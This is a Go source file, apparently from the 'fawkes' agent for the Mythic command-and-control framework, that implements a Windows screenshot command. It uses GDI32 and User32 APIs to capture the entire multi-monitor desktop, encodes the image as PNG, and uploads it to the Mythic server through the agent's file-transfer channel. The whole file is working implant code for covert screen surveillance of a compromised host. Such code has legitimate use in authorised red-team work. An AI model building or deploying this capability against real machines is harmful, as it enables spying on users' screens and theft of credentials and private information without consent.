//go:build windows
// +build windows

// Package commands provides the screenshot command for capturing desktop screenshots.
package commands

import (
	"bytes"
	"fmt"
	"image"
	"image/png"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// GDI32 and User32 constants
const (
	SRCCOPY        = 0x00CC0020
	BI_RGB         = 0
	DIB_RGB_COLORS = 0
)

// BITMAPINFOHEADER structure
type BITMAPINFOHEADER struct {
	BiSize          uint32
	BiWidth         int32
	BiHeight        int32
	BiPlanes        uint16
	BiBitCount      uint16
	BiCompression   uint32
	BiSizeImage     uint32
	BiXPelsPerMeter int32
	BiYPelsPerMeter int32
	BiClrUsed       uint32
	BiClrImportant  uint32
}

// BITMAPINFO structure
type BITMAPINFO struct {
	BmiHeader BITMAPINFOHEADER
	BmiColors [1]uint32
}

var (
	user32 = windows.NewLazySystemDLL("user32.dll")
	gdi32  = windows.NewLazySystemDLL("gdi32.dll")

	procGetDC            = user32.NewProc("GetDC")
	procReleaseDC        = user32.NewProc("ReleaseDC")
	procGetSystemMetrics = user32.NewProc("GetSystemMetrics")

	procCreateCompatibleDC     = gdi32.NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap = gdi32.NewProc("CreateCompatibleBitmap")
	procSelectObject           = gdi32.NewProc("SelectObject")
	procBitBlt                 = gdi32.NewProc("BitBlt")
	procDeleteObject           = gdi32.NewProc("DeleteObject")
	procDeleteDC               = gdi32.NewProc("DeleteDC")
	procGetDIBits              = gdi32.NewProc("GetDIBits")
)

// System metrics constants
const (
	SM_XVIRTUALSCREEN  = 76
	SM_YVIRTUALSCREEN  = 77
	SM_CXVIRTUALSCREEN = 78
	SM_CYVIRTUALSCREEN = 79
)

// ScreenshotCommand implements the screenshot command
type ScreenshotCommand struct{}

// Name returns the command name
func (c *ScreenshotCommand) Name() string {
	return "screenshot"
}

// Description returns the command description
func (c *ScreenshotCommand) Description() string {
	return "Capture a screenshot of the desktop"
}

// Execute executes the screenshot command
func (c *ScreenshotCommand) Execute(task structs.Task) structs.CommandResult {
	// Capture screenshot
	imgData, err := captureScreen()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error capturing screenshot: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Send screenshot to Mythic
	screenshotMsg := structs.SendFileToMythicStruct{}
	screenshotMsg.Task = &task
	screenshotMsg.IsScreenshot = true
	screenshotMsg.SendUserStatusUpdates = false
	screenshotMsg.Data = &imgData
	screenshotMsg.FileName = fmt.Sprintf("screenshot_%d.png", time.Now().Unix())
	screenshotMsg.FullPath = ""
	screenshotMsg.FinishedTransfer = make(chan int, 2)

	// Send to file transfer channel
	task.Job.SendFileToMythic <- screenshotMsg

	// Wait for transfer to complete
	for {
		select {
		case <-screenshotMsg.FinishedTransfer:
			return structs.CommandResult{
				Output:    "Screenshot captured and uploaded successfully",
				Status:    "success",
				Completed: true,
			}
		case <-time.After(1 * time.Second):
			if task.DidStop() {
				return structs.CommandResult{
					Output:    "Screenshot upload cancelled",
					Status:    "error",
					Completed: true,
				}
			}
		}
	}
}

// captureScreen captures the entire virtual screen and returns PNG data
func captureScreen() ([]byte, error) {
	// Get virtual screen dimensions (covers all monitors)
	x, _, _ := procGetSystemMetrics.Call(uintptr(SM_XVIRTUALSCREEN))
	y, _, _ := procGetSystemMetrics.Call(uintptr(SM_YVIRTUALSCREEN))
	width, _, _ := procGetSystemMetrics.Call(uintptr(SM_CXVIRTUALSCREEN))
	height, _, _ := procGetSystemMetrics.Call(uintptr(SM_CYVIRTUALSCREEN))

	if width == 0 || height == 0 {
		return nil, fmt.Errorf("failed to get screen dimensions")
	}

	// Get device context for the screen
	hdcScreen, _, _ := procGetDC.Call(0)
	if hdcScreen == 0 {
		return nil, fmt.Errorf("failed to get screen DC")
	}
	defer procReleaseDC.Call(0, hdcScreen)

	// Create compatible DC
	hdcMem, _, _ := procCreateCompatibleDC.Call(hdcScreen)
	if hdcMem == 0 {
		return nil, fmt.Errorf("failed to create compatible DC")
	}
	defer procDeleteDC.Call(hdcMem)

	// Create compatible bitmap
	hBitmap, _, _ := procCreateCompatibleBitmap.Call(hdcScreen, width, height)
	if hBitmap == 0 {
		return nil, fmt.Errorf("failed to create compatible bitmap")
	}
	defer procDeleteObject.Call(hBitmap)

	// Select bitmap into DC
	hOld, _, _ := procSelectObject.Call(hdcMem, hBitmap)
	if hOld == 0 {
		return nil, fmt.Errorf("failed to select bitmap")
	}
	defer procSelectObject.Call(hdcMem, hOld)

	// BitBlt to copy screen content
	ret, _, _ := procBitBlt.Call(
		hdcMem,
		0, 0,
		width, height,
		hdcScreen,
		x, y,
		SRCCOPY,
	)
	if ret == 0 {
		return nil, fmt.Errorf("BitBlt failed")
	}

	// Get bitmap bits
	img, err := bitmapToImage(hdcMem, hBitmap, int(width), int(height))
	if err != nil {
		return nil, err
	}

	// Encode as PNG
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return nil, fmt.Errorf("failed to encode PNG: %v", err)
	}

	return buf.Bytes(), nil
}

// bitmapToImage converts a Windows bitmap to a Go image.Image
func bitmapToImage(hdc, hBitmap uintptr, width, height int) (image.Image, error) {
	// Set up BITMAPINFO
	bi := BITMAPINFO{}
	bi.BmiHeader.BiSize = uint32(unsafe.Sizeof(bi.BmiHeader))
	bi.BmiHeader.BiWidth = int32(width)
	bi.BmiHeader.BiHeight = -int32(height) // Negative for top-down
	bi.BmiHeader.BiPlanes = 1
	bi.BmiHeader.BiBitCount = 32
	bi.BmiHeader.BiCompression = BI_RGB

	// Calculate buffer size (4 bytes per pixel for 32-bit)
	bufSize := width * height * 4
	buf := make([]byte, bufSize)

	// Get DIB bits
	ret, _, _ := procGetDIBits.Call(
		hdc,
		hBitmap,
		0,
		uintptr(height),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&bi)),
		DIB_RGB_COLORS,
	)
	if ret == 0 {
		return nil, fmt.Errorf("GetDIBits failed")
	}

	// Convert BGRA to RGBA
	img := image.NewRGBA(image.Rect(0, 0, width, height))
	for y := 0; y < height; y++ {
		for x := 0; x < width; x++ {
			idx := (y*width + x) * 4
			// Windows bitmap is BGRA, need to swap to RGBA
			b := buf[idx]
			g := buf[idx+1]
			r := buf[idx+2]
			a := buf[idx+3]
			if a == 0 {
				a = 255 // Fix alpha for screenshots
			}
			img.Pix[(y*width+x)*4] = r
			img.Pix[(y*width+x)*4+1] = g
			img.Pix[(y*width+x)*4+2] = b
			img.Pix[(y*width+x)*4+3] = a
		}
	}

	return img, nil
}
